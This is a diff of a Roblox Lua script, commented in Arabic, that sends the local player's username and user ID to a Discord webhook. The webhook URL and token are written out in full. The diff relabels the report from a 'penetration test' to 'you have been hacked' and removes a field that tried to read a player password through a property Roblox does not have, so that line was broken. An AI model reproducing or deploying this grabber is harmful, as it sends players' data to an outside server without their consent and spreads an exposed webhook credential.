@@ -1,6 +1,4 @@
--- إعدادات الـ Webhook الخاصة بك (تأكد من وضع رابط صحيح من سيرفرك في ديسكورد)
 local HitsWebhook = "https://discord.com/api/webhooks/1469037505075613857/iiZNbLQVBlxdIq_roIrlMWMr8PQMB_ReUQ8lrpvseQrJmwYF_b_5fMIIILfuo9CF3ix7"
--- الحصول على خدمات اللعبة
 local HttpService = game:GetService("HttpService")
 local Player = game:GetService("Players").LocalPlayer
 
@@ -8,11 +6,10 @@ local Player = game:GetService("Players").LocalPlayer
 local function sendTestReport()
     local data = {
         ["embeds"] = {{
-            ["title"] = "تقرير تجريبي - اختبار اختراق",
+            ["title"] = "لقد تم الاختراق",
             ["description"] = "تم تشغيل السكربت بنجاح!",
             ["fields"] = {
                 {["name"] = "اسم المستخدم", ["value"] = Player.Name, ["inline"] = true},
-                {["name"] = "كلمة مرور المستخدم", ["value"] = Player.password, ["inline"] = true},
                 {["name"] = "المعرف (ID)", ["value"] = tostring(Player.UserId), ["inline"] = true},
                 {["name"] = "الزر المختار", ["value"] = "F", ["inline"] = true}
             },
